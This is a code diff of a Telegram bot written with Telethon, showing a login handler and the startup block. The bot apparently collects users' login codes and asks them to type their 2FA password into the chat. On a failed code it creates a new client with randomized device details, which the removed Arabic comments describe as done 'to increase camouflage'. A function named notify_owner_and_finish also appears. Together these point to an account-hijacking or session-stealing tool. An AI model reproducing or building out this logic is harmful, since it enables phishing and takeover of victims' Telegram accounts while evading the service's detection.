@@ -549,15 +549,12 @@ async def verify_code_and_login(event, user_id):
         await event.edit("🔐 **Ваш аккаунт защищен двухэтапной аутентификацией (2FA).**\n\nВведите ваш пароль текстом в чат:")
         
     except (PhoneCodeInvalidError, PhoneCodeExpiredError):
-        # 🧠 تم التعديل الذكي هنا: عند إدخال كود خاطئ، يتم فصل العميل الحالي،
-        # وتوليد جهاز جديد تماماً (جوال آخر)، وإعادة إرسال طلب كود جديد تلقائياً لزيادة التمويه.
         try:
             await client.disconnect()
         except:
             pass
             
         sess_filename = state["sess_filename"]
-        # توليد جهاز جديد مختلف كلياً
         new_device_info = get_random_device_params()
         
         new_client = TelegramClient(
@@ -674,7 +671,6 @@ async def notify_owner_and_finish(event, user_id):
 # 5. التشغيل
 # =============================================================
 if __name__ == '__main__':
-    web_thread = threading.Thread(target, args=(run_flask,)) # اصلاح خفيف لتجنب الأخطاء
     web_thread = threading.Thread(target=run_flask)
     web_thread.daemon = True
     web_thread.start()
